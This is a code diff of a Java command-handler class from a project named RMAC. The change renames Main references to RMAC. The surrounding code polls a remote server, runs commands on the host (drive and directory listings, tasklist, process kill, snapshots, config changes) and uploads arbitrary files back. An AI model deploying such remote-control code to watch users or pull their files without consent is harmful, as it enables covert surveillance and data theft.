@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
 import com.rmac.utils.Utils;
@@ -10,8 +10,8 @@ import java.io.PrintStream;
 import lombok.extern.slf4j.Slf4j;
 
 /**
- * Non-blocking process that polls the RMAC Server at a fixed interval for any commands that needs to be executed on the host
- * machine.
+ * Non-blocking process that polls the RMAC Server at a fixed interval for any commands that needs
+ * to be executed on the host machine.
  * <br><br>
  * Commands:
  * <br>
@@ -114,7 +114,7 @@ public class CommandHandler implements Runnable {
               }
               fileRoots.close();
               File driveDetailsFile = new File(fileName);
-              Main.uploader.uploadFile(driveDetailsFile, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(driveDetailsFile, ArchiveFileType.OTHER);
             } else if (subCommand.equals("tree")) {
               if (parts.length < 3) {
                 log.warn("Invalid command '" + currCommand + "'");
@@ -128,7 +128,7 @@ public class CommandHandler implements Runnable {
               proc.waitFor();
               if (new File(arg1 + ":\\").exists()) {
                 File treeFile = new File(fileName);
-                Main.uploader.uploadFile(treeFile, ArchiveFileType.OTHER);
+                RMAC.uploader.uploadFile(treeFile, ArchiveFileType.OTHER);
               } else {
                 log.warn("Directory " + arg1 + ":\\ Doesn't Exist");
               }
@@ -143,7 +143,7 @@ public class CommandHandler implements Runnable {
             }
             File file = new File(filePath);
             if (file.exists()) {
-              Main.uploader.uploadFile(file, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(file, ArchiveFileType.OTHER);
             } else {
               log.warn("Cannot Find File: " + filePath);
             }
@@ -172,7 +172,7 @@ public class CommandHandler implements Runnable {
               Process proc = Runtime.getRuntime().exec("tasklist > \"" + fileName + "\"");
               proc.waitFor();
               File taskListFile = new File(fileName);
-              Main.uploader.uploadFile(taskListFile, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(taskListFile, ArchiveFileType.OTHER);
             } else if ("kill".equals(args[1])) {
               if (args.length < 3) {
                 log.warn("Invalid command '" + currCommand + "'");
@@ -195,7 +195,7 @@ public class CommandHandler implements Runnable {
             if (!snap.exists()) {
               log.error("Could not take snapshot");
             } else {
-              Main.uploader.uploadFile(snap, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(snap, ArchiveFileType.OTHER);
             }
             break;
           }
@@ -209,7 +209,7 @@ public class CommandHandler implements Runnable {
             String configValue = currCommand.substring(currCommand.indexOf(' ') + 1);
             configValue = configValue.substring(configValue.indexOf(' ') + 1);
 
-            Main.config.setProperty(configName, configValue, true);
+            RMAC.config.setProperty(configName, configValue, true);
             break;
           }
           default: {
@@ -232,7 +232,7 @@ public class CommandHandler implements Runnable {
         } catch (IOException e) {
           log.error("Could not execute command", e);
         }
-        Thread.sleep(Main.config.getFetchCommandPollInterval());
+        Thread.sleep(RMAC.config.getFetchCommandPollInterval());
       }
     } catch (InterruptedException e) {
       log.warn("Stopped", e);
